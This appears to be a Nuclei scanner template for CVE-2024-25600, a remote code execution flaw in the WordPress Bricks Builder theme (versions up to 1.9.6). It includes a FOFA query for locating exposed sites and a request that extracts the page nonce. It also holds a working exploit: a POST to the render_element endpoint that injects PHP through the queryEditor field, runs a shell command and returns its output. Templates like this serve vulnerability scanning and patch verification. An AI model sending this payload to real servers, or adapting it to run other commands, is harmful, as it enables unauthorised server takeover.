id: WordPress-Bricks-Builder-RCE-CVE-2024-25600
info:
  name: WordPress Bricks Builder RCE远程命令执行
  author: status
  severity: critical
  description: WordPress Bricks Builder 小于等于1.9.6的版本存在远程代码执行漏洞，攻击者可以通过该漏洞远程执行任意代码，控制服务器。
  remediation: fixed in 1.9.7
  reference:
    - https://blog.csdn.net/qq_67810151/article/details/136262850
    - https://cn-sec.com/archives/2519410.html
  metadata:
    fofa-query: 'body="/wp-content/themes/bricks/"'
  tags: wordpress,cve,rce,bricks

requests:
  - raw:
    - |
      GET / HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0
      Referer: https://{{Hostname}}/

    - |
      POST /wp-json/bricks/v1/render_element HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0
      Referer: https://{{Hostname}}/
      Content-Type: application/json
      Content-Length: 269
      
      {"postId": "1",{{nonce}},"element": {"name": "container","settings": {"hasLoop": "true","query": {"useQueryEditor": true,	"queryEditor": "ob_start();echo `id`;$output=ob_get_contents();ob_end_clean();throw new Exception($output);",	"objectType": "post"	}}}}
      
    extractors:
      - type: regex
        name: nonce
        part: body
        internal: true
        regex:
          - '"nonce":"(.{10})"'
    redirects: true
    max-redirects: 2
    matchers:
      - type: word
        words:
          - 'Exception: uid='
        part: body


